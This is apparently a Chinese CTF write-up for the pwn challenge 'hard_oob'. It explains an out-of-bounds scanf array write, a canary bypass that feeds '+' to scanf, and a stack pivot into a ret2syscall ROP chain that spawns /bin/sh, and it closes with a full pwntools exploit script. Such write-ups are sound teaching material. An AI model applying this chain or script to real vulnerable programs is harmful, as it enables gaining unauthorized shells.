---
title: pwn做题记录：hard_oob
date: 2026-07-31
categories: 安全
---

# pwn做题记录：hard_oob
**题目链接：https://platform.cyclens.tech/#/challenge/70**

下载附件之后用checksec看一下，64位，开了NX，canary，没开PIE
![image](/images/pwn做题记录：hardoob/img_1.png)

放到ida里看看吧，有一大堆函数，里面大部分都是没用的，只看main里面有的就行了。main函数里面先是向bss中写入一段数据，然后调用一个getInt函数
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setup(argc, argv, envp);
  puts("Very well then lets learn to input a string but length matters? Nah");
  puts("Here goes the string");
  read(0LL, &buf_0, 216LL);
  getInt();
  close(1u);
  close(2u);
  return 0;
}
```
getInt里面**向一个数组v7里面输入18个数，但是这个v7在定义时只能存十个数**，下标是0~9，下方用scanf写入的时候for循环里写的是( i = 0; i <= 17; ++i)，写入18个数会使后面8个数溢出
```
__int64 getInt()
{
  int v0; // ecx
  int v1; // r8d
  int v2; // r9d
  char v4; // [rsp+0h] [rbp-40h]
  int i; // [rsp+8h] [rbp-38h]
  unsigned int v6; // [rsp+Ch] [rbp-34h]
  _DWORD v7[10]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  puts("Give some space for the array to fit in the stack\nEnter the integers for now... \n");
  for ( i = 0; i <= 17; ++i )
    _isoc99_scanf((unsigned int)"%d", (unsigned int)&v7[i], 4 * i, v0, v1, v2, v4);
  return v6;
}
```
但是开了canary，该如何绕过呢？这里利用了scanf的一个特性，scanf允许输入符号，**当输入是一个‘+’号后面没有数字时，会导致转换失败，不会写入任何值，被写入的地方会保持它原本的值。** 利用这一点，当溢出写道canary的位置，也就是rbp-0x8的位置时只输入‘+’号就可以绕过canary
由于开了NX，没法把shellcode写道前面的buf里面然后ret2shellcode，从程序中能找到很多需要的gadget，可以考虑先将ret2syscall的payload写道前面的buf中后栈迁移过去执行。64位的ret2syscall就是想办法执行execve(‘/bin/sh\x00’，null,null)，把rax设为0x3b，rdi设为“/bin/sh\x00”字符串的地址，rsi和rdx设为0，然后syscall。找到对应的gadget写payload
```
payload=p64(pop_rax_rdx_rbx_ret)+p64(0x3b)+p64(0)+p64(0)+p64(pop_rdi_ret)+p64(buf+(0x8*9))+p64(pop_rsi_ret)+p64(0)+p64(syscall)+b'/bin/sh\x00'

```
在后面利用漏洞进行栈迁移时要注意int长度和寄存器长度的问题，**x86-64的c语言中的int类型数据为4字节，而一个寄存器长度为8字节。** v7定义时是一个int类型的数组，每个输入的数据只有4字节，而后面覆盖rbp和rip时每个寄存器则需要8字节的数据，就是两个int，canary也是一样，绕过时则输入两次‘+’号。由于是小端序，我们先写入的数在低4字节，后写入的在高4字节，所以**每次覆盖一个地址后需要跟着输入一个整数0来补全高4字节**
栈迁移利用就是将要迁移到的地址放到rbp，函数末尾执行一次leave;ret之后想办法让它再执行一次，执行两次leave:ret之后会把栈给移到rbp+0x8的位置。这里要覆盖rbp的地址就是buf-0x8
后面不需要的数用0填充就行
```
io.recvuntil('Enter the integers for now... \n')
for i in range(10):
    io.sendline(b'0')
io.sendline(b'+')
io.sendline(b'+')
io.sendline(str(buf-0x8))
io.sendline(b'0')
io.sendline(str(leave_ret))
io.sendline(b'0')
io.sendline(b'0')
io.sendline(b'0')
io.interactive()

```
迁移之后就会来到我们之前写入的payload，拿到shell
![image](/images/pwn做题记录：hardoob/img_2.png)

### 完整脚本代码
```
from pwn import *

io=process('./chall')
#io=remote('challenge.cyclens.tech',31419)

pop_rax_rdx_rbx_ret=0x000000000049c19a
pop_rdi_ret=0x00000000004018ea
pop_rsi_ret=0x000000000040f34e
leave_ret=0x0000000000401e90
syscall=0x00000000004012e3
buf=0x0000000004E2320

payload=p64(pop_rax_rdx_rbx_ret)+p64(0x3b)+p64(0)+p64(0)+p64(pop_rdi_ret)+p64(buf+(0x8*9))+p64(pop_rsi_ret)+p64(0)+p64(syscall)+b'/bin/sh\x00'

io.recvuntil('Here goes the string\n')
io.sendline(payload)

io.recvuntil('Enter the integers for now... \n')
for i in range(10):
    io.sendline(b'0')
io.sendline(b'+')
io.sendline(b'+')
io.sendline(str(buf-0x8))
io.sendline(b'0')
io.sendline(str(leave_ret))
io.sendline(b'0')
io.sendline(b'0')
io.sendline(b'0')
io.interactive()

```